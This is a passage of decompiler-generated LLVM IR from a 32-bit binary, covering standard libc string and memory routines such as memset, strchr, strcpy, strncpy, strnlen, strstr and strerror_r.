dec_label_pc_804f689:                             ; preds = %entry
  %v0_804f689 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f689 = inttoptr i32 %v0_804f689 to i16*
  %v2_804f689 = load i16, i16* %v1_804f689, align 2
  %v3_804f689 = load i32, i32* %edi.global-to-local, align 4
  %v4_804f689 = inttoptr i32 %v3_804f689 to i16*
  store i16 %v2_804f689, i16* %v4_804f689, align 2
  %v5_804f689 = load i32, i32* %edi.global-to-local, align 4
  %v6_804f689 = load i32, i32* %esi.global-to-local, align 4
  %v9_804f689 = add i32 %v5_804f689, 2
  %v10_804f689 = add i32 %v6_804f689, 2
  store i32 %v9_804f689, i32* %edi.global-to-local, align 4
  store i32 %v10_804f689, i32* %esi.global-to-local, align 4
  %v0_804f68b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f68b

dec_label_pc_804f68b:                             ; preds = %entry, %dec_label_pc_804f689
  %v0_804f68b = phi i32 [ %v0_804f685, %entry ], [ %v0_804f68b.pre, %dec_label_pc_804f689 ]
  %v2_804f68b = urem i32 %v0_804f68b, 2
  %v3_804f68b = icmp eq i32 %v2_804f68b, 0
  br i1 %v3_804f68b, label %dec_label_pc_804f690, label %dec_label_pc_804f68f

dec_label_pc_804f68f:                             ; preds = %dec_label_pc_804f68b
  %v0_804f68f = load i32, i32* %esi.global-to-local, align 4
  %v1_804f68f = inttoptr i32 %v0_804f68f to i8*
  %v2_804f68f = load i8, i8* %v1_804f68f, align 1
  %v3_804f68f = load i32, i32* %edi.global-to-local, align 4
  %v4_804f68f = inttoptr i32 %v3_804f68f to i8*
  store i8 %v2_804f68f, i8* %v4_804f68f, align 1
  %v5_804f68f = load i32, i32* %edi.global-to-local, align 4
  %v6_804f68f = load i32, i32* %esi.global-to-local, align 4
  %v9_804f68f = add i32 %v5_804f68f, 1
  %v10_804f68f = add i32 %v6_804f68f, 1
  store i32 %v9_804f68f, i32* %edi.global-to-local, align 4
  store i32 %v10_804f68f, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f690

dec_label_pc_804f690:                             ; preds = %dec_label_pc_804f68b, %dec_label_pc_804f68f
  store i32 %v4_804f67a, i32* %eax.global-to-local, align 4
  %v2_804f694 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f694, i32* @esi, align 4
  ret i32 %v4_804f67a

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_804f690, { 1, 0 }
  uselistorder label %dec_label_pc_804f68b, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804f698 = load i32, i32* @edi, align 4
  %v4_804f6a1 = ptrtoint i8* %arg1 to i32
  %v5_804f6a5 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_804f6a5 = ptrtoint i8* %v5_804f6a5 to i32
  store i32 %v6_804f6a5, i32* @ecx, align 4
  store i32 %v0_804f698, i32* @edi, align 4
  ret i32 %v4_804f6a1

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804f6b1 = ptrtoint i8* %arg1 to i32
  %v2_804f6b9 = mul i32 %arg2, 256
  %v3_804f6b9 = and i32 %v2_804f6b9, 65280
  %v4_804f6b9 = and i32 %arg2, -65281
  %v5_804f6b9 = or i32 %v3_804f6b9, %v4_804f6b9
  br label %dec_label_pc_804f6bb

dec_label_pc_804f6bb:                             ; preds = %dec_label_pc_804f6c0, %entry
  %v4_804f6bb = phi i32 [ %v6_804f6bb, %dec_label_pc_804f6c0 ], [ %v5_804f6b9, %entry ]
  %v7_804f6bb = phi i32 [ %v10_804f6bb, %dec_label_pc_804f6c0 ], [ %v4_804f6b1, %entry ]
  %v1_804f6bb = inttoptr i32 %v7_804f6bb to i8*
  %v2_804f6bb = load i8, i8* %v1_804f6bb, align 1
  %v10_804f6bb = add i32 %v7_804f6bb, 1
  %v3_804f6bc = udiv i32 %v4_804f6bb, 256
  %v4_804f6bc = trunc i32 %v3_804f6bc to i8
  %v16_804f6bc = icmp eq i8 %v2_804f6bb, %v4_804f6bc
  br i1 %v16_804f6bc, label %dec_label_pc_804f6c9, label %dec_label_pc_804f6c0

dec_label_pc_804f6c0:                             ; preds = %dec_label_pc_804f6bb
  %v3_804f6bb = zext i8 %v2_804f6bb to i32
  %v5_804f6bb = and i32 %v4_804f6bb, -256
  %v6_804f6bb = or i32 %v3_804f6bb, %v5_804f6bb
  %v4_804f6c0 = icmp eq i8 %v2_804f6bb, 0
  %v1_804f6c2 = icmp eq i1 %v4_804f6c0, false
  br i1 %v1_804f6c2, label %dec_label_pc_804f6bb, label %dec_label_pc_804f6c4

dec_label_pc_804f6c4:                             ; preds = %dec_label_pc_804f6c0
  br label %dec_label_pc_804f6c9

dec_label_pc_804f6c9:                             ; preds = %dec_label_pc_804f6bb, %dec_label_pc_804f6c4
  %v0_804f6c9 = phi i32 [ 1, %dec_label_pc_804f6c4 ], [ %v10_804f6bb, %dec_label_pc_804f6bb ]
  %v1_804f6cb = add i32 %v0_804f6c9, -1
  ret i32 %v1_804f6cb

; uselistorder directives
  uselistorder i8 %v2_804f6bb, { 1, 2, 0 }
  uselistorder i32 %v4_804f6bb, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f6c9, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f6d1 = load i32, i32* @esi, align 4
  store i32 %v0_804f6d1, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f6d9 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f6d9, i32* %edi.global-to-local, align 4
  %v4_804f6dd.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804f6dd

dec_label_pc_804f6dd:                             ; preds = %dec_label_pc_804f6dd.dec_label_pc_804f6dd_crit_edge, %entry
  %v2_804f6de = phi i32 [ %v7_804f6de, %dec_label_pc_804f6dd.dec_label_pc_804f6dd_crit_edge ], [ %v4_804f6d9, %entry ]
  %v4_804f6dd = phi i32 [ %v0_804f6df, %dec_label_pc_804f6dd.dec_label_pc_804f6dd_crit_edge ], [ %v4_804f6dd.pre, %entry ]
  %v7_804f6dd = phi i32 [ %v0_804f6dd.pre, %dec_label_pc_804f6dd.dec_label_pc_804f6dd_crit_edge ], [ %arg2, %entry ]
  %v1_804f6dd = inttoptr i32 %v7_804f6dd to i8*
  %v2_804f6dd = load i8, i8* %v1_804f6dd, align 1
  %v3_804f6dd = zext i8 %v2_804f6dd to i32
  %v5_804f6dd = and i32 %v4_804f6dd, -256
  %v6_804f6dd = or i32 %v3_804f6dd, %v5_804f6dd
  store i32 %v6_804f6dd, i32* %eax.global-to-local, align 4
  %v10_804f6dd = add i32 %v7_804f6dd, 1
  store i32 %v10_804f6dd, i32* %esi.global-to-local, align 4
  %v3_804f6de = inttoptr i32 %v2_804f6de to i8*
  store i8 %v2_804f6dd, i8* %v3_804f6de, align 1
  %v4_804f6de = load i32, i32* %edi.global-to-local, align 4
  %v7_804f6de = add i32 %v4_804f6de, 1
  store i32 %v7_804f6de, i32* %edi.global-to-local, align 4
  %v0_804f6df = load i32, i32* %eax.global-to-local, align 4
  %v3_804f6df = trunc i32 %v0_804f6df to i8
  %v4_804f6df = icmp eq i8 %v3_804f6df, 0
  %v1_804f6e1 = icmp eq i1 %v4_804f6df, false
  br i1 %v1_804f6e1, label %dec_label_pc_804f6dd.dec_label_pc_804f6dd_crit_edge, label %dec_label_pc_804f6e3

dec_label_pc_804f6dd.dec_label_pc_804f6dd_crit_edge: ; preds = %dec_label_pc_804f6dd
  %v0_804f6dd.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f6dd

dec_label_pc_804f6e3:                             ; preds = %dec_label_pc_804f6dd
  store i32 %v4_804f6d9, i32* %eax.global-to-local, align 4
  %v2_804f6e7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f6e7, i32* @edx, align 4
  %v2_804f6e8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f6e8, i32* @esi, align 4
  ret i32 %v4_804f6d9

; uselistorder directives
  uselistorder i32 %v0_804f6df, { 1, 0 }
  uselistorder i32 %v7_804f6de, { 1, 0 }
  uselistorder i32 %v4_804f6d9, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f701 = load i32, i32* @esi, align 4
  store i32 %v0_804f701, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f70d = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f70d, i32* %edi.global-to-local, align 4
  %v1_804f711 = add i32 %arg3, 1
  store i32 %v1_804f711, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f712

dec_label_pc_804f712:                             ; preds = %dec_label_pc_804f715, %entry
  %v3_804f716 = phi i32 [ %v4_804f70d, %entry ], [ %v8_804f716, %dec_label_pc_804f715 ]
  %v0_804f712 = phi i32 [ %v1_804f711, %entry ], [ %v0_804f712.pre, %dec_label_pc_804f715 ]
  %v1_804f712 = add i32 %v0_804f712, -1
  %v8_804f712 = icmp eq i32 %v1_804f712, 0
  store i32 %v1_804f712, i32* %ecx.global-to-local, align 4
  br i1 %v8_804f712, label %.loopexit, label %dec_label_pc_804f715

dec_label_pc_804f715:                             ; preds = %dec_label_pc_804f712
  %v0_804f715 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f715 = inttoptr i32 %v0_804f715 to i8*
  %v2_804f715 = load i8, i8* %v1_804f715, align 1
  %v12_804f715 = add i32 %v0_804f715, 1
  store i32 %v12_804f715, i32* %esi.global-to-local, align 4
  %v4_804f716 = inttoptr i32 %v3_804f716 to i8*
  store i8 %v2_804f715, i8* %v4_804f716, align 1
  %v5_804f716 = load i32, i32* %edi.global-to-local, align 4
  %v8_804f716 = add i32 %v5_804f716, 1
  store i32 %v8_804f716, i32* %edi.global-to-local, align 4
  %v6_804f717 = icmp eq i8 %v2_804f715, 0
  %v1_804f719 = icmp eq i1 %v6_804f717, false
  %v0_804f712.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_804f719, label %dec_label_pc_804f712, label %dec_label_pc_804f71b

dec_label_pc_804f71b:                             ; preds = %dec_label_pc_804f715
  %v1_804f71b = add i32 %v0_804f712.pre, -1
  store i32 %v1_804f71b, i32* %ecx.global-to-local, align 4
  %v2_804f71c = sext i8 %v2_804f715 to i32
  %v4_804f71c = inttoptr i32 %v8_804f716 to i8*
  %v5_804f71c = call i8* @_memset(i8* %v4_804f71c, i32 %v2_804f71c, i32 %v1_804f71b)
  %v6_804f71c = ptrtoint i8* %v5_804f71c to i32
  store i32 %v6_804f71c, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804f712, %dec_label_pc_804f71b
  %v2_804f723 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f723, i32* %esi.global-to-local, align 4
  ret i32 %v4_804f70d

; uselistorder directives
  uselistorder i32 %v8_804f716, { 0, 2, 1 }
  uselistorder i8 %v2_804f715, { 0, 2, 1 }
  uselistorder i32 %v1_804f712, { 1, 0 }
  uselistorder i32 %v4_804f70d, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_1()
  %v4_804f728 = ptrtoint i8* %tmp4 to i32
  %v8_804f73b8 = icmp eq i32 %tmp, 0
  %v1_804f73c10 = icmp eq i1 %v8_804f73b8, false
  br i1 %v1_804f73c10, label %dec_label_pc_804f735, label %dec_label_pc_804f73e

dec_label_pc_804f735:                             ; preds = %entry, %dec_label_pc_804f73a
  %v1_804f73b12 = phi i32 [ %v1_804f73b, %dec_label_pc_804f73a ], [ %tmp, %entry ]
  %v0_804f73e11 = phi i32 [ %v1_804f73a, %dec_label_pc_804f73a ], [ %v4_804f728, %entry ]
  %v1_804f735 = inttoptr i32 %v0_804f73e11 to i8*
  %v2_804f735 = load i8, i8* %v1_804f735, align 1
  %v3_804f735 = icmp eq i8 %v2_804f735, 0
  br i1 %v3_804f735, label %dec_label_pc_804f73e, label %dec_label_pc_804f73a

dec_label_pc_804f73a:                             ; preds = %dec_label_pc_804f735
  %v1_804f73a = add i32 %v0_804f73e11, 1
  %v1_804f73b = add i32 %v1_804f73b12, -1
  %v8_804f73b = icmp eq i32 %v1_804f73b, 0
  %v1_804f73c = icmp eq i1 %v8_804f73b, false
  br i1 %v1_804f73c, label %dec_label_pc_804f735, label %dec_label_pc_804f73e

dec_label_pc_804f73e:                             ; preds = %dec_label_pc_804f73a, %dec_label_pc_804f735, %entry
  %v0_804f73e.lcssa = phi i32 [ %v4_804f728, %entry ], [ %v0_804f73e11, %dec_label_pc_804f735 ], [ %v1_804f73a, %dec_label_pc_804f73a ]
  %v2_804f73e = sub i32 %v0_804f73e.lcssa, %v4_804f728
  ret i32 %v2_804f73e

; uselistorder directives
  uselistorder i32 %v1_804f73b, { 1, 0 }
  uselistorder i32 %v0_804f73e11, { 0, 2, 1 }
  uselistorder i32 %v4_804f728, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f735, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %v0_804f747 = load i32, i32* @ebx, align 4
  %v4_804f74b = ptrtoint i8* %arg2 to i32
  %v2_804f753 = load i8, i8* %arg2, align 1
  %v1_804f756 = icmp eq i8 %v2_804f753, 0
  br i1 %v1_804f756, label %dec_label_pc_804f80a, label %dec_label_pc_804f761

dec_label_pc_804f761:                             ; preds = %entry
  %v1_804f761 = add i32 %arg1, -1
  br label %dec_label_pc_804f762

dec_label_pc_804f762:                             ; preds = %dec_label_pc_804f76e, %dec_label_pc_804f761
  %v0_804f762 = phi i32 [ %v1_804f762, %dec_label_pc_804f76e ], [ %v1_804f761, %dec_label_pc_804f761 ]
  %v1_804f762 = add i32 %v0_804f762, 1
  %v1_804f763 = inttoptr i32 %v1_804f762 to i8*
  %v2_804f763 = load i8, i8* %v1_804f763, align 1
  %v1_804f766 = icmp eq i8 %v2_804f763, 0
  br i1 %v1_804f766, label %dec_label_pc_804f808, label %dec_label_pc_804f76e

dec_label_pc_804f76e:                             ; preds = %dec_label_pc_804f762
  %v14_804f76e = icmp eq i8 %v2_804f763, %v2_804f753
  %v1_804f771 = icmp eq i1 %v14_804f76e, false
  br i1 %v1_804f771, label %dec_label_pc_804f762, label %dec_label_pc_804f773

dec_label_pc_804f773:                             ; preds = %dec_label_pc_804f76e
  %v1_804f773 = add i32 %v4_804f74b, 1
  %v2_804f77a = inttoptr i32 %v1_804f773 to i8*
  %v3_804f77a = load i8, i8* %v2_804f77a, align 1
  %v1_804f77e = icmp eq i8 %v3_804f77a, 0
  br i1 %v1_804f77e, label %dec_label_pc_804f80a, label %dec_label_pc_804f786

dec_label_pc_804f786:                             ; preds = %dec_label_pc_804f773
  %v1_804f786 = add i32 %v0_804f762, 2
  %v1_804f7d0 = add i32 %v4_804f74b, 2
  %v2_804f7d0 = inttoptr i32 %v1_804f7d0 to i8*
  br label %dec_label_pc_804f7bc

dec_label_pc_804f791:                             ; preds = %dec_label_pc_804f800
  %v2_804f791 = inttoptr i32 %v0_804f7c2 to i8*
  %v3_804f791 = load i8, i8* %v2_804f791, align 1
  br label %dec_label_pc_804f7af.preheader

dec_label_pc_804f7af.preheader:                   ; preds = %dec_label_pc_804f791, %dec_label_pc_804f7bc
  %v0_804f79a.ph.in = phi i8 [ %v4_804f786.sink.in, %dec_label_pc_804f7bc ], [ %v3_804f791, %dec_label_pc_804f791 ]
  %v14_804f7af46 = icmp eq i8 %v0_804f79a.ph.in, %v2_804f753
  %v1_804f7b248 = icmp eq i1 %v14_804f7af46, false
  br i1 %v1_804f7b248, label %dec_label_pc_804f79a, label %dec_label_pc_804f7b4

dec_label_pc_804f79a:                             ; preds = %dec_label_pc_804f7af.preheader, %dec_label_pc_804f7ab
  %v0_804f79a50.in = phi i8 [ %v2_804f7ac, %dec_label_pc_804f7ab ], [ %v0_804f79a.ph.in, %dec_label_pc_804f7af.preheader ]
  %v0_804f79e49 = phi i32 [ %v1_804f7ab, %dec_label_pc_804f7ab ], [ %v0_804f7c2, %dec_label_pc_804f7af.preheader ]
  %v1_804f79a = icmp eq i8 %v0_804f79a50.in, 0
  br i1 %v1_804f79a, label %dec_label_pc_804f808, label %dec_label_pc_804f79e

dec_label_pc_804f79e:                             ; preds = %dec_label_pc_804f79a
  %v1_804f79e = add i32 %v0_804f79e49, 1
  %v1_804f79f = inttoptr i32 %v1_804f79e to i8*
  %v2_804f79f = load i8, i8* %v1_804f79f, align 1
  %v14_804f7a2 = icmp eq i8 %v2_804f79f, %v2_804f753
  br i1 %v14_804f7a2, label %dec_label_pc_804f7b4, label %dec_label_pc_804f7a7

dec_label_pc_804f7a7:                             ; preds = %dec_label_pc_804f79e
  %v1_804f7a7 = icmp eq i8 %v2_804f79f, 0
  br i1 %v1_804f7a7, label %dec_label_pc_804f808, label %dec_label_pc_804f7ab

dec_label_pc_804f7ab:                             ; preds = %dec_label_pc_804f7a7
  %v1_804f7ab = add i32 %v0_804f79e49, 2
  %v1_804f7ac = inttoptr i32 %v1_804f7ab to i8*
  %v2_804f7ac = load i8, i8* %v1_804f7ac, align 1
  %v14_804f7af = icmp eq i8 %v2_804f7ac, %v2_804f753
  %v1_804f7b2 = icmp eq i1 %v14_804f7af, false
  br i1 %v1_804f7b2, label %dec_label_pc_804f79a, label %dec_label_pc_804f7b4

dec_label_pc_804f7b4:                             ; preds = %dec_label_pc_804f7ab, %dec_label_pc_804f79e, %dec_label_pc_804f7af.preheader
  %v0_804f7b4 = phi i32 [ %v0_804f7c2, %dec_label_pc_804f7af.preheader ], [ %v1_804f79e, %dec_label_pc_804f79e ], [ %v1_804f7ab, %dec_label_pc_804f7ab ]
  %v1_804f7b4 = add i32 %v0_804f7b4, 1
  br label %dec_label_pc_804f7bc

dec_label_pc_804f7bc:                             ; preds = %dec_label_pc_804f786, %dec_label_pc_804f7b4
  %v0_804f7c2 = phi i32 [ %v1_804f786, %dec_label_pc_804f786 ], [ %v1_804f7b4, %dec_label_pc_804f7b4 ]
  %v4_804f786.sink.in.in.in = phi i32 [ %v1_804f786, %dec_label_pc_804f786 ], [ %v1_804f7b4, %dec_label_pc_804f7b4 ]
  %v4_804f786.sink.in.in = inttoptr i32 %v4_804f786.sink.in.in.in to i8*
  %v4_804f786.sink.in = load i8, i8* %v4_804f786.sink.in.in, align 1
  %storemerge5 = icmp eq i8 %v4_804f786.sink.in, %v3_804f77a
  %v1_804f7bc = icmp eq i1 %storemerge5, false
  br i1 %v1_804f7bc, label %dec_label_pc_804f7af.preheader, label %dec_label_pc_804f7be

dec_label_pc_804f7be:                             ; preds = %dec_label_pc_804f7bc
  %v1_804f7c2 = add i32 %v0_804f7c2, 1
  %v1_804f7c9 = add i32 %v0_804f7c2, -1
  %v2_804f7cc = inttoptr i32 %v1_804f7c2 to i8*
  %v3_804f7cc = load i8, i8* %v2_804f7cc, align 1
  %v4_804f7cc = zext i8 %v3_804f7cc to i32
  %v3_804f7d0 = load i8, i8* %v2_804f7d0, align 1
  %v4_804f7d0 = zext i8 %v3_804f7d0 to i32
  %v12_804f7d5 = icmp eq i8 %v3_804f7cc, %v3_804f7d0
  %v1_804f7d7 = icmp eq i1 %v12_804f7d5, false
  br i1 %v1_804f7d7, label %dec_label_pc_804f800, label %dec_label_pc_804f7d9

dec_label_pc_804f7d9:                             ; preds = %dec_label_pc_804f7be, %dec_label_pc_804f7ed
  %v0_804f7f0 = phi i32 [ %v1_804f7f0, %dec_label_pc_804f7ed ], [ %v1_804f7d0, %dec_label_pc_804f7be ]
  %v0_804f7ed = phi i32 [ %v1_804f7ed, %dec_label_pc_804f7ed ], [ %v1_804f7c2, %dec_label_pc_804f7be ]
  %v0_804f7d9 = phi i32 [ %v3_804f7f3, %dec_label_pc_804f7ed ], [ %v4_804f7cc, %dec_label_pc_804f7be ]
  %v1_804f7d9 = icmp eq i32 %v0_804f7d9, 0
  br i1 %v1_804f7d9, label %dec_label_pc_804f80a, label %dec_label_pc_804f7dd

dec_label_pc_804f7dd:                             ; preds = %dec_label_pc_804f7d9
  %v1_804f7dd = add i32 %v0_804f7ed, 1
  %v2_804f7dd = inttoptr i32 %v1_804f7dd to i8*
  %v3_804f7dd = load i8, i8* %v2_804f7dd, align 1
  %v1_804f7e1 = add i32 %v0_804f7f0, 1
  %v2_804f7e1 = inttoptr i32 %v1_804f7e1 to i8*
  %v3_804f7e1 = load i8, i8* %v2_804f7e1, align 1
  %v4_804f7e1 = zext i8 %v3_804f7e1 to i32
  %v12_804f7e5 = icmp eq i8 %v3_804f7dd, %v3_804f7e1
  %v1_804f7e7 = icmp eq i1 %v12_804f7e5, false
  br i1 %v1_804f7e7, label %dec_label_pc_804f800, label %dec_label_pc_804f7e9

dec_label_pc_804f7e9:                             ; preds = %dec_label_pc_804f7dd
  %v1_804f7e9 = icmp eq i8 %v3_804f7e1, 0
  br i1 %v1_804f7e9, label %dec_label_pc_804f80a, label %dec_label_pc_804f7ed

dec_label_pc_804f7ed:                             ; preds = %dec_label_pc_804f7e9
  %v1_804f7ed = add i32 %v0_804f7ed, 2
  %v1_804f7f0 = add i32 %v0_804f7f0, 2
  %v1_804f7f3 = inttoptr i32 %v1_804f7f0 to i8*
  %v2_804f7f3 = load i8, i8* %v1_804f7f3, align 1
  %v3_804f7f3 = zext i8 %v2_804f7f3 to i32
  %v1_804f7f7 = inttoptr i32 %v1_804f7ed to i8*
  %v2_804f7f7 = load i8, i8* %v1_804f7f7, align 1
  %v12_804f7fa = icmp eq i8 %v2_804f7f7, %v2_804f7f3
  br i1 %v12_804f7fa, label %dec_label_pc_804f7d9, label %dec_label_pc_804f7fe

dec_label_pc_804f7fe:                             ; preds = %dec_label_pc_804f7ed
  br label %dec_label_pc_804f800

dec_label_pc_804f800:                             ; preds = %dec_label_pc_804f7dd, %dec_label_pc_804f7be, %dec_label_pc_804f7fe
  %v0_804f800 = phi i32 [ %v4_804f7d0, %dec_label_pc_804f7be ], [ %v3_804f7f3, %dec_label_pc_804f7fe ], [ %v4_804f7e1, %dec_label_pc_804f7dd ]
  %v1_804f800 = icmp eq i32 %v0_804f800, 0
  %v1_804f802 = icmp eq i1 %v1_804f800, false
  br i1 %v1_804f802, label %dec_label_pc_804f791, label %dec_label_pc_804f80a

dec_label_pc_804f808:                             ; preds = %dec_label_pc_804f762, %dec_label_pc_804f7a7, %dec_label_pc_804f79a
  br label %dec_label_pc_804f80a

dec_label_pc_804f80a:                             ; preds = %dec_label_pc_804f800, %dec_label_pc_804f7d9, %dec_label_pc_804f7e9, %entry, %dec_label_pc_804f773, %dec_label_pc_804f808
  %storemerge3 = phi i32 [ 0, %dec_label_pc_804f808 ], [ %v1_804f762, %dec_label_pc_804f773 ], [ %arg1, %entry ], [ %v1_804f7c9, %dec_label_pc_804f7e9 ], [ %v1_804f7c9, %dec_label_pc_804f7d9 ], [ %v1_804f7c9, %dec_label_pc_804f800 ]
  store i32 %v0_804f747, i32* @ebx, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v1_804f7f0, { 1, 0 }
  uselistorder i32 %v1_804f7ed, { 1, 0 }
  uselistorder i8 %v3_804f7e1, { 1, 0, 2 }
  uselistorder i8 %v4_804f786.sink.in, { 1, 0 }
  uselistorder i32 %v0_804f7c2, { 4, 3, 2, 1, 0 }
  uselistorder i8 %v2_804f7ac, { 1, 0 }
  uselistorder i32 %v1_804f7ab, { 0, 2, 1 }
  uselistorder i8 %v2_804f79f, { 1, 0 }
  uselistorder i32 %v0_804f79e49, { 1, 0 }
  uselistorder i32 %v1_804f762, { 0, 2, 1 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f80a, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_804f808, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f800, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f7d9, { 1, 0 }
  uselistorder label %dec_label_pc_804f7bc, { 1, 0 }
  uselistorder label %dec_label_pc_804f79a, { 1, 0 }
  uselistorder label %dec_label_pc_804f7af.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_804f825 = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_804f82d = load i32, i32* @ebx, align 4
  ret i32 %v0_804f82d
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_804f846 = icmp ugt i32 %arg1, 124
  br i1 %v6_804f846, label %dec_label_pc_804f863, label %dec_label_pc_804f848

dec_label_pc_804f848:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_8053720.112 to i32), i32* @esi, align 4
  %v1_804f8584 = icmp eq i32 %arg1, 0
  %v1_804f85a11 = icmp eq i1 %v1_804f8584, false
  br i1 %v1_804f85a11, label %dec_label_pc_804f851, label %dec_label_pc_804f85c

dec_label_pc_804f851:                             ; preds = %dec_label_pc_804f848, %dec_label_pc_804f851
  %v0_804f854 = phi i32 [ %v3_804f854, %dec_label_pc_804f851 ], [ %arg1, %dec_label_pc_804f848 ]
  %v0_804f857 = phi i32 [ %v1_804f857, %dec_label_pc_804f851 ], [ ptrtoint ([8 x i8]* @global_var_8053720.112 to i32), %dec_label_pc_804f848 ]
  %v1_804f851 = inttoptr i32 %v0_804f857 to i8*
  %v2_804f851 = load i8, i8* %v1_804f851, align 1
  %v7_804f851 = icmp eq i8 %v2_804f851, 0
  %v2_804f854 = zext i1 %v7_804f851 to i32
  %v3_804f854 = add i32 %v2_804f854, %v0_804f854
  %v16_804f854 = icmp eq i32 %v3_804f854, 0
  %v1_804f857 = add i32 %v0_804f857, 1
  store i32 %v1_804f857, i32* @esi, align 4
  %v1_804f85a = icmp eq i1 %v16_804f854, false
  br i1 %v1_804f85a, label %dec_label_pc_804f851, label %dec_label_pc_804f85c

dec_label_pc_804f85c:                             ; preds = %dec_label_pc_804f851, %dec_label_pc_804f848
  %v0_804f85e = phi i32 [ ptrtoint ([8 x i8]* @global_var_8053720.112 to i32), %dec_label_pc_804f848 ], [ %v1_804f857, %dec_label_pc_804f851 ]
  store i32 0, i32* @ebp, align 4
  %v1_804f85e = inttoptr i32 %v0_804f85e to i8*
  %v2_804f85e = load i8, i8* %v1_804f85e, align 1
  %v3_804f85e = icmp eq i8 %v2_804f85e, 0
  %v1_804f861 = icmp eq i1 %v3_804f85e, false
  br i1 %v1_804f861, label %dec_label_pc_804f85c.dec_label_pc_804f892_crit_edge, label %dec_label_pc_804f863

dec_label_pc_804f85c.dec_label_pc_804f892_crit_edge: ; preds = %dec_label_pc_804f85c
  br label %dec_label_pc_804f892

dec_label_pc_804f863:                             ; preds = %dec_label_pc_804f85c, %entry
  %v1_804f866 = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  store i32 22, i32* @ebp, align 4
  %v6_804f877 = bitcast i32* %stack_var_-17 to i8*
  %v7_804f877 = call i32 @_uintmaxtostr(i8* %v6_804f877, i32 %arg1, i32 %v1_804f866, i32 -10, i32 0)
  %v1_804f886 = add i32 %v7_804f877, -14
  store i32 %v1_804f886, i32* @esi, align 4
  %v5_804f889 = inttoptr i32 %v1_804f886 to i8*
  store i8* %v5_804f889, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_804f886 to i16*
  %v6_804f88a = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_80536f6.113 to i32), i32 14)
  %v1_804f89c.pre = load i32, i32* @edi, align 4
  %v0_804f8a2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f892

dec_label_pc_804f892:                             ; preds = %dec_label_pc_804f85c.dec_label_pc_804f892_crit_edge, %dec_label_pc_804f863
  %v0_804f8a2 = phi i32 [ %v0_804f85e, %dec_label_pc_804f85c.dec_label_pc_804f892_crit_edge ], [ %v0_804f8a2.pre, %dec_label_pc_804f863 ]
  %v1_804f89c = phi i32 [ %arg3, %dec_label_pc_804f85c.dec_label_pc_804f892_crit_edge ], [ %v1_804f89c.pre, %dec_label_pc_804f863 ]
  %v4_804f892 = icmp eq i32 %arg2, 0
